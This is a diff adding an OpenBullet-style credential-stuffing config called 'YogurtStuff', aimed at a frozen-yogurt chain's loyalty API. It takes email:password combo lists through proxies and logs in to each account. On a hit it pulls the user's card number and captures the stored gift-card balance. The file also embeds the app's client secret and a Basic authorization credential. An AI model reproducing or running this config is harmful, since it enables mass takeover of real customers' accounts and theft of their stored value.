@@ -1,0 +1,56 @@
+[SETTINGS]
+{
+  "Name": "YogurtStuff",
+  "SuggestedBots": 1,
+  "LastModified": "2018-05-19T17:00:34.0414215+02:00",
+  "AdditionalInfo": "Henlo , captures gc which is only important thing",
+  "Author": "JamesAcupan",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#HenloPostyPost REQUEST POST "https://api.pxsweb.com/rest/16.3/oauth/requestGuestToken.json" AutoRedirect=TRUE 
+  CONTENT "{\"client_secret\":\"cMks9*a44d\",\"merchantId\":\"322\",\"client_id\":\"T_VNmjGJlTNnruIgpYrX1g9m_tB0Pv_UH81CYro_pq\",\"password\":\"<PASS>\",\"grant_type\":\"password\",\"authentication\":\"anonymous\",\"scope\":\"user_read user_write account_read account_write\",\"username\":\"<USER>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Yogurtland/8337 CFNetwork/811.5.4 Darwin/16.7.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Host: api.pxsweb.com" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "success" 
+  KEYCHAIN Failure OR 
+    KEY "no_matching_guests" 
+#Woken_Parse PARSE "<SOURCE>" LR "{\"access_token\":\"" "\"" Recursive=FALSE -> VAR "WOKEN" "" "" 
+#REQUEST_(GET) REQUEST GET "https://api.pxsweb.com/rest/16.3/guest/userInformation.json?merchantId=322&username=<USER>&authentication=oauth&access_token=<WOKEN> " AutoRedirect=FALSE 
+  CONTENT "" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Yogurtland/8337 CFNetwork/811.5.4 Darwin/16.7.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Authorization: Basic VF9WTm1qR0psVE5ucnVJZ3BZclgxZzltX3RCMFB2X1VIODFDWXJvX3BxOmNNa3M5KmE0NGQ=" 
+  HEADER "Host: api.pxsweb.com" 
+#Carducard_Parse PARSE "<SOURCE>" LR "primaryCardNumbers\":[\"" "\"" Recursive=FALSE -> VAR "CarduCardHenloooo" "" "" 
+#REQUEST_(GET) REQUEST GET "https://api.pxsweb.com/rest/16.3/guest/accountInformation.json?merchantId=322&printedCardNumber=<CarduCardHenloooo>&authentication=oauth&access_token=<WOKEN>" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Yogurtland/8337 CFNetwork/811.5.4 Darwin/16.7.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Authorization: Basic VF9WTm1qR0psVE5ucnVJZ3BZclgxZzltX3RCMFB2X1VIODFDWXJvX3BxOmNNa3M5KmE0NGQ=" 
+  HEADER "Host: api.pxsweb.com" 
+#GC! PARSE "<SOURCE>" LR "storedValueBalance\":{\"balance\":\"" "\"" Recursive=TRUE -> CAP "GC" "" "" 
